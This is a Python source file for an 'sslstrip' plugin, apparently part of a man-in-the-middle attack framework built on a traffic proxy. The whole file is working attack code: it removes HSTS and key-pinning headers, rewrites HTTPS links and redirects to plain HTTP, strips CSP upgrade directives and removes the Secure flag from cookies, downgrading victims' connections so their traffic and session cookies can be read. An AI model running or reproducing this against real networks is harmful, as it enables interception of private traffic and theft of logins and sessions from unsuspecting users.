import re
import urllib
from plugins.plugin import PluginTemplate


# MIT License
#
# Copyright (c) 2018 Marcos Nesster
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

secure_hosts = set()

class sslstrip(PluginTemplate):
    name    = 'sslstrip'
    version = '1.0'
    desc    = 'It will transparently hijack HTTP traffic on a network watch for HTTPS links and redirects .'
    def request(self, flow):
        flow.request.headers.pop('If-Modified-Since', None)
        flow.request.headers.pop('Cache-Control', None)

        # do not force https redirection
        flow.request.headers.pop('Upgrade-Insecure-Requests', None)

        # proxy connections to SSL-enabled hosts
        if flow.request.pretty_host in secure_hosts:
            flow.request.scheme = 'https'
            flow.request.port = 443

            # We need to update the request destination to whatever is specified in the host header:
            # Having no TLS Server Name Indication from the client and just an IP address as request.host
            # in transparent mode, TLS server name certificate validation would fail.
            flow.request.host = flow.request.pretty_host


    def response(self, flow):
        try:
            flow.response.headers.pop('Strict-Transport-Security', None)
            flow.response.headers.pop('Public-Key-Pins', None)

            # strip links in response body
            flow.response.content = flow.response.content.replace('https://', 'http://')

            # strip meta tag upgrade-insecure-requests in response body
            csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
            flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

            # strip links in 'Location' header
            if flow.response.headers.get('Location', '').startswith('https://'):
                location = flow.response.headers['Location']
                hostname = urllib.parse.urlparse(location).hostname
                if hostname:
                    secure_hosts.add(hostname)
                flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

            # strip upgrade-insecure-requests in Content-Security-Policy header
            if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
                csp = flow.response.headers['Content-Security-Policy']
                flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

            # strip secure flag from 'Set-Cookie' headers
            cookies = flow.response.headers.get_all('Set-Cookie')
            cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
            flow.response.headers.set_all('Set-Cookie', cookies)
        except:
            pass
